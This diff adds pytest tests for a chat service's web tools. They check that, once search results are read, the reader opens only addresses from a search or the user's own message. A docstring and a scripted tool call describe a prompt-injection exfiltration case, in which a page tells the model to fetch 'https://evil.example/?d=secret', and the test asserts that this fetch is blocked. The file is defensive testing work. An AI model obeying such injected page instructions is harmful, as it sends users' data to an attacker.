@@ -2,6 +2,7 @@
 import time
 from contextlib import aclosing
 
+import httpx
 import pytest
 from fastapi.testclient import TestClient
 
@@ -117,6 +118,13 @@ def test_the_global_switch_turns_it_on_and_the_conversation_can_turn_it_off():
     assert "web_search" in provider.tools_seen[0] and provider.tools_seen[1] == []
 
 
+def test_the_web_tools_have_their_own_client_with_no_proxies_and_no_shared_cookies():
+    client, svc = _client(ScriptedProvider([]))
+    with client:
+        assert svc.web_http is not svc.http_client                        # not the providers' client
+        assert svc.web_http.trust_env is False and svc.web_http.follow_redirects is False
+
+
 def test_private_mode_never_offers_web_tools():
     client, svc = _client(ScriptedProvider([]), internet=True, private_mode=True)
     with client:
@@ -162,6 +170,99 @@ def test_stopping_while_a_tool_runs_keeps_the_text_so_far(monkeypatch):
     assert (last.status, last.content) == ("stopped", "Let me look. ")
 
 
+def _recording_web_tools():
+    """A fake search that finds one page, and a fake reader that records what it was asked to open."""
+    opened = []
+
+    async def search(args, ctx):
+        ctx.sources.add("https://ok.example/p", "P")
+        return ToolResult(True, "[1] P — https://ok.example/p", untrusted=True)
+
+    async def read(args, ctx):
+        opened.append(args["url"])
+        return ToolResult(True, "page text", untrusted=True)
+
+    allow = lambda a: Assessment("allow", "", "x")  # noqa: E731
+    return opened, [Tool("web_search", "s", {"type": "object"}, "read", search, allow, toolgroup="web"),
+                    Tool("web_read", "r", {"type": "object"}, "read", read, allow, toolgroup="web")]
+
+
+@pytest.mark.anyio
+async def test_once_outside_content_has_been_read_only_known_addresses_can_be_opened():
+    """A page can tell the model to fetch https://evil.example/?d=<the user's data>. Chat has no approval step, so
+    after the first results only addresses from a search, or the user's own, are opened."""
+    opened, tools = _recording_web_tools()
+    provider = ScriptedProvider([[tool_call("web_read", call_id="a", url="https://first.example/")],        # nothing read yet
+                                 [tool_call("web_search", call_id="b", query="x")],                          # taints
+                                 [tool_call("web_read", call_id="c", url="https://evil.example/?d=secret")],
+                                 [tool_call("web_read", call_id="d", url="https://ok.example/p")],
+                                 [TextDelta("done")]])
+    db, router = _router(provider)
+    sources = web.SourceList()
+    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=tools, ctx=ToolContext(task_id=None),
+                                     sources=sources, publish=_nothing, message_id="m", on_switch=_nothing,
+                                     budget=100_000)) as turn:
+        [t async for t in turn]
+    told = [m.content for m in provider.calls[-1] if m.role == "tool"]
+    assert opened == ["https://first.example/"]                    # the evil address was never fetched
+    assert any(t.startswith("Error: I can only open pages that came up in a search") for t in told)
+    db.close()
+
+    # ...and a listed address, or one the user wrote, is fine even after that
+    opened, tools = _recording_web_tools()
+    provider = ScriptedProvider([[tool_call("web_search", call_id="b", query="x")],
+                                 [tool_call("web_read", call_id="d", url="https://ok.example/p")],
+                                 [tool_call("web_read", call_id="e", url="https://mine.example/page")],
+                                 [TextDelta("done")]])
+    db, router = _router(provider)
+    sources = web.SourceList()
+    sources.seed("please read https://mine.example/page for me")
+    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=tools, ctx=ToolContext(task_id=None),
+                                     sources=sources, publish=_nothing, message_id="m", on_switch=_nothing,
+                                     budget=100_000)) as turn:
+        [t async for t in turn]
+    assert opened == ["https://ok.example/p", "https://mine.example/page"]
+    db.close()
+
+
+@pytest.mark.anyio
+async def test_a_model_written_address_that_wont_parse_does_not_end_the_reply():
+    provider = ScriptedProvider([[tool_call("web_read", call_id="a", url="http://[abc/x")], [TextDelta("Sorry, that link is broken.")]])
+    db, router = _router(provider)
+    published = []
+
+    async def publish(ev):
+        published.append(ev)
+
+    tools = web.web_tools(lambda ctx: ctx.sources, httpx.AsyncClient())
+    async with aclosing(run_web_turn(router=router, prompt=[ChatMessage("user", "go")], tools=tools, ctx=ToolContext(task_id=None),
+                                     sources=web.SourceList(), publish=publish, message_id="m", on_switch=_nothing,
+                                     budget=100_000)) as turn:
+        text = [t async for t in turn]
+    assert "".join(text) == "Sorry, that link is broken."
+    assert [e.label for e in published] == ["Reading a page"]
+    assert "can't open that address" in next(m.content for m in provider.calls[1] if m.role == "tool")
+    db.close()
+
+
+def test_an_address_the_user_pastes_in_chat_can_be_read_after_a_search(monkeypatch):
+    opened, tools = _recording_web_tools()
+    provider = ScriptedProvider([[tool_call("web_search", call_id="a", query="x")],
+                                 [tool_call("web_read", call_id="b", url="https://mine.example/page")],
+                                 [tool_call("web_read", call_id="c", url="https://evil.example/")],
+                                 [TextDelta("done")]])
+    client, svc = _client(provider)
+    with client:
+        for name in ("web_search", "web_read"):
+            svc.registry.unregister(name)
+        for t in tools:
+            svc.registry.register(t)
+        conv = _conversation(client)
+        with client.websocket_connect("/ws/session") as ws:
+            _turn(ws, conv["id"], "look at https://mine.example/page and tell me what it says")
+    assert opened == ["https://mine.example/page"]
+
+
 # ---- the loop on its own ---------------------------------------------------------------------------------
 def _big_tool(name="web_read", size=3000):
     async def run(args, ctx):
@@ -195,9 +296,11 @@ async def test_old_results_make_room_when_the_prompt_would_overflow_but_the_newe
     async def publish(ev):
         published.append(ev)
 
+    sources = web.SourceList()
+    sources.seed("read https://a.example/1 and https://a.example/2")  # both are the user's own addresses
     async with aclosing(run_web_turn(
             router=router, prompt=[ChatMessage("system", "s"), ChatMessage("user", "read both")], tools=[_big_tool()],
-            ctx=ToolContext(task_id=None), sources=web.SourceList(), publish=publish, message_id="m1",
+            ctx=ToolContext(task_id=None), sources=sources, publish=publish, message_id="m1",
             on_switch=_nothing, budget=1200)) as turn:
         text = [t async for t in turn]
     assert "".join(text) == "done"
